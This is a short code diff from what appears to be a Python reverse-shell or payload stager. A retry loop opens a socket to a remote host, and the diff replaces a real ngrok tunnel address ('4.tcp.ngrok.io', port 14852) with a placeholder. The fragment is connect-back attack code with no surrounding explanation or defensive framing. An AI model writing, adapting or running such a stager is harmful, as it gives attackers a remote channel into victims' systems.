@@ -7,7 +7,7 @@ import base64
 for x in range(10):
 	try:
 		s = socket.socket(2,socket.SOCK_STREAM)
-		s.connect(("4.tcp.ngrok.io", 14852))
+		s.connect(("IPv4", 8080))
 		break
 	except:
 		time.sleep(5)
